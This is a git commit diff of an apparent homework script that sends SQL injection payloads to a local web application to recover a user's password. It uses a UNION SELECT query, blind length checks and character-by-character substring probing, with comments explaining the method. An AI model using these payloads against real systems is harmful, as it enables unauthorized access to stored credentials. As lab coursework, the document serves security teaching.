425921731f888f01fd13eac2824517143c66d518
dosarudaniel <dosarudaniel@gmail.com>
2019-11-13 14:12:22 +0100

    Added HW5 part 1.2

--- HW5/Task1/script_1.2.py
+++ HW5/Task1/script_1.2.py
@@ -1,11 +1,33 @@
 from bs4 import BeautifulSoup
-
+import string
+import random
 import requests
 from requests.exceptions import HTTPError
 
 url = "http://127.0.0.1:80/messages"
-response = requests.post(url, data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' and '1'='1"})
+
+
+
+# # First, find out the length of the password using a binary search algorithm
+# response = requests.post(url,
+# data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
+#                 and length(password)>10 and '1'='1"})
+
+# data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
+#                 and length(password)<20 and '1'='1"})
+
+# data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
+#                 and length(password)=17 and '1'='1"})
+
+# Second, find out the characters from the password, letter by letter using substring(password, 1, nr_chars_found)
+# Obs: substring first char starts from 1
+
+print(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6)))
+response = requests.post(url, data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
+                and length(password)=17 and substring(password, 1, 2)='0c' and '1'='1"})
 
 soup = BeautifulSoup(response.text, 'html.parser')
-print(soup.body)
+
 print(response)
+if (str(soup.body).find("success") != -1):
+    print("Success!")
